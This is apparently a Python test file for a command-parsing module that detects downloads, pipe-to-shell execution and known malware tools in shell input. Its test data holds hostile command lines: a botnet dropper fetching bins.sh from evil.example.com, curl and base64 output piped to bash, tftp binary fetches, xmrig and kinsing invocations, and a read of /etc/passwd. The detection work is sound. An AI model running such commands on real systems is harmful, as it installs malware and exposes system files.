from brain.commands import (
    command_name,
    domains,
    downloaded_files,
    executed_files,
    is_download,
    pipes_to_shell,
    segments,
    tool_names,
    urls,
)

BOT_LINE = "cd /tmp || cd /var/run; wget http://evil.example.com/bins.sh; chmod 777 bins.sh; sh bins.sh"


def test_segments():
    assert segments("a; b && c || d | e\nf") == ["a", "b", "c", "d", "e", "f"]
    assert segments("") == []


def test_command_name_skips_wrappers():
    assert command_name("sudo FOO=1 /usr/bin/wget x") == "wget"
    assert command_name("/bin/busybox tftp -g") == "tftp"
    assert command_name("./xmrig -o pool") == "./xmrig"


def test_urls_and_domains():
    assert urls(BOT_LINE) == ["http://evil.example.com/bins.sh"]
    assert domains(BOT_LINE) == ["evil.example.com"]
    assert domains("wget 45.9.1.2/x86") == ["45.9.1.2"]
    assert domains("cat notes.txt") == []
    assert domains("wget config.sh") == []


def test_is_download():
    assert is_download(BOT_LINE)
    assert is_download("curl -fsSL https://x.io/i.sh | bash")
    assert is_download("tftp -g -r mips 1.2.3.4")
    assert is_download("scp user@host:/f .")
    assert not is_download("curl --version")
    assert not is_download("cat wget.log")


def test_downloaded_and_executed_files():
    assert downloaded_files(BOT_LINE) == ["bins.sh"]
    assert downloaded_files("wget -O /tmp/.x http://a.b/c") == [".x", "c"]
    assert executed_files(BOT_LINE) == ["bins.sh"]
    assert executed_files("./xmrig -o x; /tmp/kd") == ["xmrig", "kd"]
    assert executed_files("bash -i") == []


def test_pipes_to_shell():
    assert pipes_to_shell("curl x | sh")
    assert pipes_to_shell("echo aGk= | base64 -d | bash")
    assert not pipes_to_shell("ls | grep sh")


def test_tool_names():
    assert "xmrig" in tool_names("./xmrig --donate-level 1")
    assert "kinsing" in tool_names("wget http://a.b/kinsing")
    assert tool_names("ls -la; cat /etc/passwd; uname -a") == []
